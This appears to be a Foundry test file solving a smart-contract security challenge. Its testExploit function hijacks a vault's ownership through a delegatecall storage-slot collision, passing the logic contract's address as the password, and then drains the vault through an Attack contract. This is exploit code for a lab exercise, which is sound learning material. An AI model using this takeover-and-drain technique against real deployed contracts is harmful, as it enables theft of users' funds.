// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attack.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        //add your hacker code.
        Attack a = new Attack(address(vault));
        // 对函数签名和参数进行编码,VaultLogic password 刚好跟 vault logic 位置对齐了，哪怕不对齐 password变量在区块链上也是透明的，不应该如此操作
        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            bytes32(uint256(uint160(address(logic)))),
            palyer
        );
        //
        address(vault).call(data);
        console.log("owner", vault.owner());
        vault.openWithdraw();
        //开始攻击
        a.attack{value: 0.1 ether}();
        //提现到owner
        a.withdraw();
        console.log("Attack balance", address(a).balance);
        console.log("vault balance", address(vault).balance);
        console.log("palyer balance", address(palyer).balance);

        require(vault.isSolve(), "solved");

        vm.stopPrank();
    }
}
